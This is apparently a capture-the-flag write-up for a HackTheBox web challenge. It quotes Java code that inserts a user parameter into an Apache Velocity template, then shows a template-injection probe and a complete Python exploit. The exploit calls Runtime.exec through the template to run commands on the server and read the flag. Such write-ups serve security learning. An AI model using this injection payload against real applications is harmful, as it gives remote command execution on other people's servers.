# Labyrinth Linguist

You and your faction find yourselves cornered in a refuge corridor inside a maze while being chased by a KORP mutant exterminator. While planning your next move you come across a translator device left by previous Fray competitors, it is used for translating english to voxalith, an ancient language spoken by the civilization that originally built the maze. It is known that voxalith was also spoken by the guardians of the maze that were once benign but then were turned against humans by a corrupting agent KORP devised. You need to reverse engineer the device in order to make contact with the mutant and claim your last chance to make it out alive.

## Writeup

We can send a **text** param that will replace the **TEXT placeholder** of **index.html** as we can see in the code:

```java
@RequestMapping("/")
@ResponseBody
String index(@RequestParam(required = false, name = "text") String textString) {
    if (textString == null) {
        textString = "Example text";
    }

    String template = "";

    try {
        template = readFileToString("/app/src/main/resources/templates/index.html", textString);
    } catch (IOException e) {
        e.printStackTrace();
    }

    RuntimeServices runtimeServices = RuntimeSingleton.getRuntimeServices();
    StringReader reader = new StringReader(template);

    org.apache.velocity.Template t = new org.apache.velocity.Template();
    t.setRuntimeServices(runtimeServices);
    try {

        t.setData(runtimeServices.parse(reader, "home"));
        t.initDocument();
        VelocityContext context = new VelocityContext();
        context.put("name", "World");

        StringWriter writer = new StringWriter();
        t.merge(context, writer);
        template = writer.toString();

    } catch (ParseException e) {
        e.printStackTrace();
    }

    return template;
}

public static String readFileToString(String filePath, String replacement) throws IOException {
    StringBuilder content = new StringBuilder();
    BufferedReader bufferedReader = null;

    try {
        bufferedReader = new BufferedReader(new FileReader(filePath));
        String line;
        
        while ((line = bufferedReader.readLine()) != null) {
            line = line.replace("TEXT", replacement);
            content.append(line);
            content.append("\n");
        }
    } finally {
        if (bufferedReader != null) {
            try {
                bufferedReader.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    return content.toString();
}
```

So it is vulnerable to **SSTI** for **velocity**, we can try to use this **PoC**:

```java
#set($run=7*7) $run
```

The output is:

```
49
```

So now, we can write an exploit to use this vulnerability to make some **RCE**:

```python
#!/usr/bin/python3
import requests


ip = "83.136.255.205"
port = 51683
"""
ip = "localhost"
port = 1337
"""

url = f"http://{ip}:{port}/"

PoC = "#set($run=7*7) $run"

command = "cat /flaga68e9e6704.txt"

payload = f"""
#set($x='')
#set($rt=$x.class.forName('java.lang.Runtime'))
#set($chr=$x.class.forName('java.lang.Character'))
#set($str=$x.class.forName('java.lang.String'))
#set($ex=$rt.getRuntime().exec('{command}'))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
"""

req = requests.post(url, params={'text': payload})
print(req.text)
```

The flag is:

```
HTB{f13ry_t3mpl4t35_fr0m_th3_d3pth5!!}
```